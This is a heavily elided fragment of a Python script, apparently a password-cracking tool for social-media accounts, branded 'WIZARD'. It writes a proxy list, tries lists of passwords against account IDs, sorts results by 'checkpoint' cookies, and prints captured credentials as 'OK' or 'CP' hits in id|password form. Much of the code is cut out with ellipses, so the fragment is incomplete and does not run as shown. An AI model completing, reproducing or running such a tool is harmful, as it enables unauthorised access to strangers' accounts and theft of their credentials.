...
import time
os.system("clear")
print("   \033[1;32mTHIS TOOLS CODDED BY (WIZARD) ")
time.sleep(5)
...
try:
    ...
    open('.prox.txt','w').write(prox)
        ...
        print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;97mWIZARD-XD]')
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h}  LOGIN DONE.........RUN AGAIN!!!!{x} ');time.sleep(2)
		exit()
	except Exception as e:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [WIZARD]%s/%s  [OK]*%s | [CP]*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{b}🔒WIZARD-CP🔒 : {K}{idf}|{pw}')
				...
				print(f'\r{b}💉💙WIZARD-OK💙💉 : {H}{idf}|{pw}')
